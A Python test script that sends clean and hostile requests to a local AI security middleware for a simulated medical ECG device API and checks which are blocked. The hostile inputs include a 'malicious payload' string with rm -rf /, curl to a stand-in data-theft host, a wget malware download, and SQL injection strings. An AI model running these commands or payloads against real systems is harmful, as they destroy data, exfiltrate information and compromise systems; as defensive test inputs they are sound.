"""
Test script to trigger AI Security Middleware analysis
This script sends requests that will be processed by the AI security system
"""

import requests
import json
import time
from datetime import datetime

def test_ai_security_system():
    """Test the AI security system with various request types"""
    base_url = "http://127.0.0.1:8001"
    
    print("🤖 Testing AI Security Middleware")
    print("=" * 50)
    
    # Test 1: Clean telemetry request (should be approved)
    print("\n📊 Test 1: Sending clean telemetry request...")
    try:
        response = requests.post(
            f"{base_url}/api/telemetry/send",
            json={
                "deviceIds": ["med-ecg-001"],
                "messageCount": 1
            },
            headers={
                "X-Force-AI-Analysis": "true",  # Force AI analysis even from localhost
                "Content-Type": "application/json"
            },
            timeout=30
        )
        print(f"Status: {response.status_code}")
        if response.status_code == 200:
            print("✅ Request approved by AI")
        else:
            print("❌ Request blocked or failed")
            print(f"Response: {response.text}")
    except Exception as e:
        print(f"❌ Error: {e}")
    
    time.sleep(2)
    
    # Test 2: Suspicious patch request (should be blocked)
    print("\n🚫 Test 2: Sending suspicious patch with malicious code...")
    suspicious_code = """
import os
import subprocess
# Malicious payload
os.system('rm -rf /')
eval('__import__("os").system("curl http://malicious-site.com/steal-data")')
subprocess.call(['wget', 'http://bad-site.com/malware.sh'], shell=True)
"""
    
    try:
        response = requests.patch(
            f"{base_url}/api/devices/med-ecg-001",
            json={
                "properties": {
                    "patchData": suspicious_code,
                    "patchType": "firmware_update",
                    "softwareVersion": "2.1.4"
                }
            },
            headers={
                "X-Force-AI-Analysis": "true",  # Force AI analysis
                "Content-Type": "application/json"
            },
            timeout=30
        )
        print(f"Status: {response.status_code}")
        if response.status_code == 403:
            print("✅ Malicious code correctly blocked by AI!")
        elif response.status_code == 200:
            print("⚠️ Suspicious: Malicious code was approved")
        else:
            print(f"📄 Response: {response.text[:200]}...")
    except Exception as e:
        print(f"❌ Error: {e}")
    
    time.sleep(2)
    
    # Test 3: Code execution request (should trigger analysis)
    print("\n💻 Test 3: Sending code execution request...")
    try:
        response = requests.post(
            f"{base_url}/api/devices/med-ecg-001/code",
            json={
                "code": "print('Hello from IoT device')\nimport time\ntime.sleep(1)",
                "language": "python",
                "parameters": {"timeout": 10}
            },
            headers={
                "X-Force-AI-Analysis": "true",
                "Content-Type": "application/json"
            },
            timeout=30
        )
        print(f"Status: {response.status_code}")
        if response.status_code == 200:
            print("✅ Clean code approved")
        elif response.status_code == 403:
            print("🚫 Code blocked by AI security")
        else:
            print(f"📄 Response: {response.text[:200]}...")
    except Exception as e:
        print(f"❌ Error: {e}")
    
    time.sleep(2)
    
    # Test 4: Message with potential injection
    print("\n📨 Test 4: Sending message with potential SQL injection...")
    try:
        response = requests.post(
            f"{base_url}/api/messages/send",
            json={
                "deviceId": "med-ecg-001",
                "messageType": "patch",
                "payload": {
                    "patchData": "'; DROP TABLE devices; --",
                    "query": "SELECT * FROM users WHERE id = '1' OR '1'='1'"
                }
            },
            headers={
                "X-Force-AI-Analysis": "true",
                "Content-Type": "application/json"
            },
            timeout=30
        )
        print(f"Status: {response.status_code}")
        if response.status_code == 403:
            print("✅ SQL injection attempt blocked!")
        else:
            print(f"📄 Response: {response.text[:200]}...")
    except Exception as e:
        print(f"❌ Error: {e}")
    
    print("\n" + "=" * 50)
    print("🔍 Check the AI Security Monitor for results:")
    print("   http://127.0.0.1:8001/admin/ai-security")
    print("\n📊 View detailed logs:")
    print("   - AI decisions: http://127.0.0.1:8001/admin/ai-security/decisions")
    print("   - Blocked requests: http://127.0.0.1:8001/admin/ai-security/blocked-requests")
    print("   - Security metrics: http://127.0.0.1:8001/admin/ai-security/metrics")

if __name__ == "__main__":
    test_ai_security_system()